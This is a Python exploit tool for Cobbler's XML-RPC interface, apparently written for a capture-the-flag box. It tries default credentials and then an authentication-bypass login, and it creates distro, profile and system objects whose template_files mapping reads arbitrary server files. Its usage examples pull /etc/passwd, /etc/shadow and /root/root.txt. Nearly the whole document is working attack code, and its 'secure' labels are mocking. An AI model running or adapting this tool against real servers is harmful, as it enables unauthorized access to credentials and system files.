#!/usr/bin/env python3
"""
Consolidated Cobbler XML-RPC Exploitation Tool
Clean, typed, SECURE implementation with proper output validation ..lol..
"""
import xmlrpc.client
import re
import sys
import time
import argparse
import os
from typing import Dict, List, Tuple, Optional, Any, Union
from urllib.parse import urlparse

class CobblerExploit:
    """Secure Cobbler XML-RPC exploitation class"""
    
    def __init__(self, target: str, username: str = "cobbler", password: str = "cobbler"):
        self.target = self._sanitize_target(target)
        self.username = username
        self.password = password
        self.server = self._create_server()
        self.token: Optional[str] = None
        self.auth_method: Optional[str] = None
        
    def _sanitize_target(self, target: str) -> str:
        """Securely sanitize and validate target URL"""
        if not target:
            raise ValueError("Target cannot be empty")
            
        # Basic URL validation
        if not re.match(r'^[\w\.-]+:\d+$|^https?://', target):
            raise ValueError("Invalid target format")
            
        if "://" not in target:
            target = f"http://{target}/RPC2"
        elif not target.endswith("/RPC2"):
            target = target.rstrip("/") + "/RPC2"
            
        # Parse and validate
        parsed = urlparse(target)
        if not parsed.hostname:
            raise ValueError("Invalid hostname in target")
            
        return target
    
    def _create_server(self) -> xmlrpc.client.ServerProxy:
        """Create XML-RPC server proxy with timeout"""
        return xmlrpc.client.ServerProxy(self.target, allow_none=True)
    
    def authenticate(self, quiet: bool = False) -> bool:
        """Authenticate with target server"""
        # Try credential authentication first
        try:
            self.token = self.server.login(self.username, self.password)
            self.auth_method = "credentials"
            if not quiet:
                print(f"[+] Authenticated with credentials: {self.username}")
            return True
        except Exception as cred_error:
            if not quiet:
                print(f"[-] Credential auth failed: {cred_error}")
        
        # Try bypass authentication
        try:
            self.token = self.server.login("", -1)
            self.auth_method = "bypass"
            if not quiet:
                print("[+] Authenticated with bypass token")
            return True
        except Exception as bypass_error:
            if not quiet:
                print(f"[-] Bypass auth failed: {bypass_error}")
            return False
    
    def discover_info(self, quiet: bool = False) -> Dict[str, Any]:
        """Discover server capabilities and existing objects"""
        info = {
            'version': None,
            'methods': [],
            'distros': [],
            'kernel_candidates': []
        }
        
        # Version detection
        try:
            info['version'] = self.server.version()
        except Exception:
            pass
        
        # Method discovery
        test_methods = [
            "get_template_file_for_system", "get_distros", "get_profiles", 
            "new_distro", "new_profile", "new_system", "sync"
        ]
        
        for method in test_methods:
            if hasattr(self.server, method):
                info['methods'].append(method)
        
        # Get existing distros for kernel discovery
        try:
            distros = self.server.get_distros(self.token)
            info['distros'] = distros
            
            # Extract kernel/initrd paths from existing distros
            for distro in distros:
                if isinstance(distro, dict):
                    kernel = distro.get('kernel')
                    initrd = distro.get('initrd')
                    if kernel and initrd:
                        info['kernel_candidates'].append((kernel, initrd))
        except Exception:
            pass
        
        if not quiet:
            print(f"[+] Server version: {info['version'] or 'Unknown'}")
            print(f"[+] Available methods: {len(info['methods'])}")
            print(f"[+] Existing distros: {len(info['distros'])}")
            print(f"[+] Kernel candidates: {len(info['kernel_candidates'])}")
        
        return info
    
    def _get_kernel_initrd(self, kernel: Optional[str] = None, 
                          initrd: Optional[str] = None, 
                          info: Optional[Dict] = None) -> Tuple[Optional[str], Optional[str]]:
        """Get usable kernel and initrd paths"""
        if kernel and initrd:
            return kernel, initrd
        
        # Use discovered candidates
        if info and info['kernel_candidates']:
            return info['kernel_candidates'][0]
        
        # Common fallback paths
        common_pairs = [
            ("/boot/vmlinuz-6.1.0-37-amd64", "/boot/initrd.img-6.1.0-37-amd64"),
            ("/boot/vmlinuz-5.15.0-generic", "/boot/initrd.img-5.15.0-generic"),
            ("/boot/vmlinuz", "/boot/initrd.img"),
        ]
        
        return common_pairs[0]
    
    def _sanitize_filepath(self, filepath: str) -> str:
        """Sanitize file path for security"""
        if not filepath:
            raise ValueError("File path cannot be empty")
        
        # Basic path validation - allow absolute paths for system files
        if not filepath.startswith('/'):
            raise ValueError("Only absolute paths allowed")
        
        # Prevent some dangerous patterns
        dangerous = ['..', '\\', '\x00', '\r', '\n']
        for danger in dangerous:
            if danger in filepath:
                raise ValueError(f"Dangerous character/pattern in path: {danger}")
        
        return filepath
    
    def read_file(self, filepath: str, kernel: Optional[str] = None, 
                  initrd: Optional[str] = None, quiet: bool = False) -> Optional[str]:
        """Read file using template_files exploit"""
        
        if not self.token:
            raise RuntimeError("Not authenticated")
        
        filepath = self._sanitize_filepath(filepath)
        
        # Get kernel/initrd
        if not kernel or not initrd:
            info = self.discover_info(quiet=True)
            kernel, initrd = self._get_kernel_initrd(kernel, initrd, info)
        
        if not kernel or not initrd:
            if not quiet:
                print("[-] No usable kernel/initrd available")
            return None
        
        try:
            # Generate unique object names
            timestamp = int(time.time())
            suffix = hash(filepath) % 10000
            
            names = {
                'distro': f"exp_d_{timestamp}_{suffix}",
                'profile': f"exp_p_{timestamp}_{suffix}", 
                'system': f"exp_s_{timestamp}_{suffix}",
                'dest': f"/exp_{timestamp}_{suffix}"
            }
            
            if not quiet:
                print(f"[*] Creating exploit objects for {filepath}...")
            
            # Create distro
            distro_id = self.server.new_distro(self.token)
            self.server.modify_distro(distro_id, "name", names['distro'], self.token)
            self.server.modify_distro(distro_id, "breed", "redhat", self.token)
            self.server.modify_distro(distro_id, "arch", "x86_64", self.token)
            self.server.modify_distro(distro_id, "kernel", kernel, self.token)
            self.server.modify_distro(distro_id, "initrd", initrd, self.token)
            self.server.save_distro(distro_id, self.token)
            
            # Create profile
            profile_id = self.server.new_profile(self.token)
            self.server.modify_profile(profile_id, "name", names['profile'], self.token)
            self.server.modify_profile(profile_id, "distro", names['distro'], self.token)
            self.server.save_profile(profile_id, self.token)
            
            # Create system with template mapping
            system_id = self.server.new_system(self.token)
            self.server.modify_system(system_id, "name", names['system'], self.token)
            self.server.modify_system(system_id, "profile", names['profile'], self.token)
            self.server.modify_system(system_id, "template_files", 
                                    {filepath: names['dest']}, self.token)
            self.server.save_system(system_id, self.token)
            
            # Sync configuration
            try:
                self.server.sync(self.token)
            except Exception:
                pass  # Non-critical
            
            # Attempt to read the file
            for use_token in [False, True]:
                try:
                    if use_token:
                        data = self.server.get_template_file_for_system(
                            names['system'], names['dest'], self.token)
                    else:
                        data = self.server.get_template_file_for_system(
                            names['system'], names['dest'])
                    
                    if data and isinstance(data, str):
                        if not quiet:
                            print(f"[+] Successfully read {filepath} ({len(data)} bytes)")
                        return data
                        
                except Exception:
                    continue
            
            if not quiet:
                print(f"[-] Failed to read {filepath}")
            return None
            
        except Exception as e:
            if not quiet:
                print(f"[-] Exploit error for {filepath}: {e}")
            return None
    
    def read_multiple_files(self, filepaths: List[str], **kwargs) -> Dict[str, str]:
        """Read multiple files efficiently"""
        results = {}
        quiet = kwargs.get('quiet', False)
        
        for filepath in filepaths:
            if not quiet:
                print(f"[*] Reading {filepath}...")
            
            data = self.read_file(filepath, quiet=True, **kwargs)
            if data:
                results[filepath] = data
                if not quiet:
                    print(f"[+] Success: {len(data)} bytes")
            elif not quiet:
                print("[-] Failed")
        
        return results

def validate_output_file(output_file: str) -> str:
    """SECURELY validate output file to prevent overwriting system files"""
    
    # Get absolute path
    abs_path = os.path.abspath(output_file)
    
    # DANGEROUS system directories/files to protect
    dangerous_paths = [
        '/etc/', '/bin/', '/sbin/', '/usr/bin/', '/usr/sbin/',
        '/boot/', '/root/', '/home/', '/var/log/', '/proc/', '/sys/',
        '/dev/', '/tmp/shadow', '/tmp/passwd'  # Even temp versions
    ]
    
    dangerous_files = [
        'passwd', 'shadow', 'sudoers', 'ssh_host_key', 'id_rsa',
        'authorized_keys', '.bashrc', '.bash_profile', '.profile'
    ]
    
    # Check if trying to write to dangerous directories
    for dangerous_path in dangerous_paths:
        if abs_path.startswith(dangerous_path):
            raise ValueError(f"DENIED: Cannot write to system directory {dangerous_path}")
    
    # Check for dangerous filenames
    filename = os.path.basename(abs_path).lower()
    for dangerous_file in dangerous_files:
        if dangerous_file in filename:
            raise ValueError(f"DENIED: Cannot write to file containing '{dangerous_file}'")
    
    # Must be in current directory or explicitly safe subdirectory
    current_dir = os.getcwd()
    if not abs_path.startswith(current_dir):
        # Allow explicit safe subdirectories
        safe_dirs = ['/tmp/cobbler_output', '/home/' + os.getenv('USER', 'unknown')]
        if not any(abs_path.startswith(safe) for safe in safe_dirs):
            raise ValueError(f"DENIED: Output must be in current directory or safe location")
    
    # Final filename validation
    if not re.match(r'^[\w\.-]+$', os.path.basename(abs_path)):
        raise ValueError("DENIED: Invalid characters in filename")
    
    # Check if file already exists and is important
    if os.path.exists(abs_path):
        print(f"[!] WARNING: File {abs_path} already exists!")
        response = input("Do you want to overwrite it? [y/N]: ").lower().strip()
        if response not in ['y', 'yes']:
            raise ValueError("User cancelled overwrite")
    
    return abs_path

def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='Consolidated Cobbler XML-RPC Exploitation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 127.0.0.1:25151 --read-file /root/root.txt
  %(prog)s target.com:25151 --read-files /etc/passwd /etc/shadow
  %(prog)s 192.168.1.10:25151 --enum-only
  %(prog)s 127.0.0.1:25151 --read-file /etc/passwd -o safe_output.txt

SECURITY NOTE: Output files are restricted to current directory for safety!
        """
    )
    
    parser.add_argument('target', help='Target host:port')
    parser.add_argument('--read-file', metavar='PATH', 
                       help='Read single file')
    parser.add_argument('--read-files', metavar='PATH', nargs='+',
                       help='Read multiple files')
    parser.add_argument('--enum-only', action='store_true',
                       help='Only enumerate, no file reading')
    parser.add_argument('--kernel', metavar='PATH',
                       help='Specify kernel path')
    parser.add_argument('--initrd', metavar='PATH',
                       help='Specify initrd path')
    parser.add_argument('-u', '--username', default='cobbler',
                       help='Username (default: cobbler)')
    parser.add_argument('-p', '--password', default='cobbler', 
                       help='Password (default: cobbler)')
    parser.add_argument('-o', '--output', metavar='FILE',
                       help='Save results to file (current directory only!)')
    parser.add_argument('-q', '--quiet', action='store_true',
                       help='Quiet mode')
    
    return parser.parse_args()

def save_results(results: Dict[str, str], output_file: str) -> None:
    """Securely save results to file with validation"""
    try:
        # SECURE validation of output file
        safe_output_path = validate_output_file(output_file)
        
        with open(safe_output_path, 'w', encoding='utf-8') as f:
            for filepath, content in results.items():
                f.write(f"=== {filepath} ===\n")
                f.write(content)
                if not content.endswith('\n'):
                    f.write('\n')
                f.write(f"=== END {filepath} ===\n\n")
        
        print(f"[+] Results safely saved to {safe_output_path}")
        
    except Exception as e:
        print(f"[-] Failed to save results: {e}")
        print(f"[!] For security, output is restricted to current directory")

def main() -> int:
    """Main execution function"""
    try:
        args = parse_arguments()
        
        if not args.quiet:
            print(f"[*] Cobbler Exploit Tool - Target: {args.target}")
            print("=" * 50)
        
        # Initialize exploiter
        exploiter = CobblerExploit(args.target, args.username, args.password)
        
        # Authenticate
        if not exploiter.authenticate(args.quiet):
            print("[-] Authentication failed")
            return 1
        
        # Enumeration
        info = exploiter.discover_info(args.quiet)
        
        if args.enum_only:
            return 0
        
        # File operations
        results = {}
        
        if args.read_file:
            data = exploiter.read_file(args.read_file, args.kernel, args.initrd, args.quiet)
            if data:
                results[args.read_file] = data
        
        elif args.read_files:
            results = exploiter.read_multiple_files(
                args.read_files, kernel=args.kernel, initrd=args.initrd, quiet=args.quiet)
        
        else:
            # Default demo
            if not args.quiet:
                print("\n[*] Demo: Reading /etc/passwd")
            data = exploiter.read_file("/etc/passwd", args.kernel, args.initrd, args.quiet)
            if data:
                results["/etc/passwd"] = data
        
        # Display results
        if results and not args.output and not args.quiet:
            for filepath, content in results.items():
                print(f"\n{'='*50}")
                print(f"CONTENT OF {filepath}:")
                print('='*50)
                print(content, end="" if content.endswith('\n') else '\n')
                print('='*50)
        
        # Save results SECURELY
        if args.output and results:
            save_results(results, args.output)
        
        if not args.quiet:
            print(f"\n[+] Successfully read {len(results)} file(s)")
        
        return 0
        
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user")
        return 1
    except Exception as e:
        print(f"[-] Error: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
